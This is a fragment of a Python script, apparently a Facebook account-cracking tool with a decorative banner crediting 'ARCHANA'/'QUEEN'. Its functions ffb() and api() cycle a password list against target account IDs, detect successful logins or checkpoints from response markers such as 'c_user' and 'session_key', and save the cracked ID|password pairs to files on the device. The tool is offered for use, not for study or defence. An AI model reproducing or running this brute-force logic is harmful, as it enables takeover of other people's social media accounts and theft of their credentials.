...
_____   _____ _    _          _   _          
     /\   |  __ \ / ____| |  | |   /\   | \ | |   /\ 
    /  \  | |__) | |    | |__| |  /  \  |  \| |  /  \ 
   / /\ \ |  _  /| |    |  __  | / /\ \ | . ` | / /\ \  \033[1;34m𝐏 \033[1;37m
  / ____ \| | \ \| |____| |  | |/ ____ \| |\  |/ ____ \ \033[1;31m 𝐑\033[1;37m
 /_/    \_\_|  \_\\_____|_|  |_/_/    \_\_| \_/_/    \_\  \033[1;35m𝐎 \033[1;37m
----------------------------------------------
 Owner    : ARCHANA
 Github    : PRIVATE
 Facebook  : QUEEN
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('https://www.facebook.com/profile.php?id=100086574822415');menu()
                        elif xd in ['7','07']:
                                os.system('');menu()
                        elif xd in ['8','08']:
                                os.system('');menu()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [QUEEN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [QUEEN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/QUEEN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [QUEEN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/QUEEN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [QUEEN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/QUEEN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/QUEEN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [QUEEN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/QUEEN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [QUEEN-OK] '+uid+' | '+pas+'\033[1;97m')
